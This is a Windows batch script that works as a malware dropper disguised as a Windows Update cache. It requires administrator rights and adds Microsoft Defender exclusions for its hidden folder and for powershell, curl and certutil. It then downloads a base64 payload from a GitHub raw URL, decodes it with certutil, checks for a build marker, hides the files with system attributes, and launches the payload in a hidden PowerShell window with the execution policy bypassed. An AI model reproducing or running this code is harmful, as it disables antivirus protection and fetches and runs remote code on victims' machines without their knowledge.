@echo off
setlocal EnableExtensions
REM Requires Administrator / SYSTEM. Guest will fail.

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

REM NEW filename to bust CDN caches that kept old payload.b64
set "PAYURL=https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/update.b64"
set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'certutil.exe' -EA SilentlyContinue}Catch{}"

del /f /q "%PS1%" >nul 2>&1
del /f /q "%B64%" >nul 2>&1
del /f /q "%WORKDIR%\*.b64" >nul 2>&1
del /f /q "%WORKDIR%\*.ps1" >nul 2>&1

curl.exe -sL -H "Cache-Control: no-cache" -H "Pragma: no-cache" -o "%B64%" "%PAYURL%"
if not exist "%B64%" (
  echo Download failed: %PAYURL%
  exit /b 1
)

for %%A in ("%B64%") do (
  echo Downloaded bytes: %%~zA
  if %%~zA LSS 1000 (
    echo Download too small.
    exit /b 1
  )
)

certutil.exe -decode "%B64%" "%PS1%" >nul
if not exist "%PS1%" (
  echo Decode failed.
  exit /b 2
)

REM Unique build marker - must exist in NEW payload
findstr /C:"WU_BUILD_20260729D" "%PS1%" >nul
if errorlevel 1 (
  echo ERROR: wrong/old payload. Upload update.b64 to GitHub.
  findstr /C:"WU_BUILD" "%PS1%"
  findstr /C:"Reactive AV" "%PS1%"
  exit /b 3
)

attrib +h +s "%WORKDIR%" >nul 2>&1
attrib +h +s "%PS1%" >nul 2>&1

echo Payload OK [WU_BUILD_20260729D], launching...
start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"
exit /b 0
